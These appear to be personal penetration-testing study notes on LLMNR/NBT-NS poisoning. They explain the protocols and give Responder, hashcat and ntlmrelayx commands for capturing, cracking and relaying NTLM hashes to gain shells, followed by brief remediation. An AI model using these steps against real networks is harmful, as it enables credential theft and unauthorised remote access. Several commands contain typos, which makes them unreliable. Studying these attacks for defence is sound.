**LLMNR/NBT-NS Poisoning**:  
LLMNR is a protocol to perform name resolution on the same local network without a DNS server..  
When a host’s DNS query fails (i.e., the DNS server doesn’t know the name),  
the host broadcasts an LLMNR request on the local network to see if any other host can answer.  

LLMNR is the successor to Netbios(Network basic input/output system), NBT-NS is a name service component of Netbios over TCP/IP.  
Like LLMNS, NBT-NS is a fallback when DNS fails wihtin local network  

LLMNR is enabled yby default, uss port 5355 over UDP natively..  
NBT-NS utilizes port 137 over UDP.  

LLMNR poisoning is an attack where malicious actor listens for LLMNR requests and responds with thier own IP address.  
This can lead to credential theft and relay attacks.  
When victim responds, it contains NETNTLM hash and username - the ntlm challenge encrypted with ntlm hash of user  

**Attack**: reponder for nix and inveigh for windows, crack or relay  
**Reponder**: 
Start responder and try random address on victim y \\soda or access responder ip \\10.1.1.1  
sudo responder -I etho  //default settings  responder --help for more options  
settings to disable service - /etc/responder/Responder.conf  
Logs at - /usr/share/responder/logs  

Inveigh: powershell alternate of responder.. for attack from windows -- google  

**Crack**: copy full hash  
hashcat -m 5600 soda_ntlmv2 /usr/share/wordlists/rockyou.txt  

**SMB Relay**: If captured hashes don't crack, then relay them! good if relayed user is admin - can give shell by writing to $admin  
relay wokrs if SMB signing is disabled and relayed creds is admin on target ! - gives shell  

For relay – switch off SMB and http in the responder config file.  
should not respond bu relay hence disabling sudo mousepad  /etc/responder/Responder.conf   

sudo responder -I eth0 -dwPV   //start responder  
netlmrelayx.py -tf targets.txt -smb2support -I  //interactive shell - connect to given port  
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami   //run one command  
\\\10.1.1.1  --- kali ip event trigger on victim - should successfully capture and relay users hash  

**Remediation**: Disable LLLMNS and NBT-NS, strong passwor policy  
**Prevent relays**: enable SMB signing, LAPS service for admin access  


